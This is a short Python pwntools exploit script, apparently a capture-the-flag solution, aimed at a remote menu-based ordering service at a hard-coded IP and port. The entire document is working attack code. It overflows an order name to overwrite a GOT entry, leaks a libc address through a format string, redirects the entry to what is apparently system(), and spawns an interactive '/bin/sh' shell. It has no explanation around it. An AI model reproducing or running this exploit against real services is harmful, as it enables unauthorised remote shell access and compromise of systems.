from pwn import *

#s = remote('192.168.33.10',1234)
s= remote('52.30.206.11', 1337)

def add_order_name(select,name):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil(':')
  s.sendline(str(select))
  s.recvuntil(':')
  s.sendline('y')
  s.recvuntil(':')
  s.send(name)

def add_order(select):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil(':')
  s.sendline(str(select))
  s.recvuntil(':')
  s.sendline('n')

def remove_order(select):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(str(select))

def edit_order(index, name):
  s.recvuntil('>')
  s.sendline('4')
  s.recvuntil(':')
  s.sendline(str(index))
  s.recvuntil(":")
  s.send(name)

add_order_name(1,"A"*0x10)
add_order_name(1,"A"*0x10)
edit_order(0,"A"*0x24+p32(0x804C014)+"\x00")
edit_order(1,p32(0x080484D0)+"\x00")
add_order_name(1,"%p")
remove_order(2)
libc = int(s.recvuntil('removed')[1:11],16) - 0x1b0000
print hex(libc)
edit_order(1,p32(libc+0x3a940)+"\x00")
add_order_name(1,"/bin/sh\x00")
remove_order(3)
s.interactive()
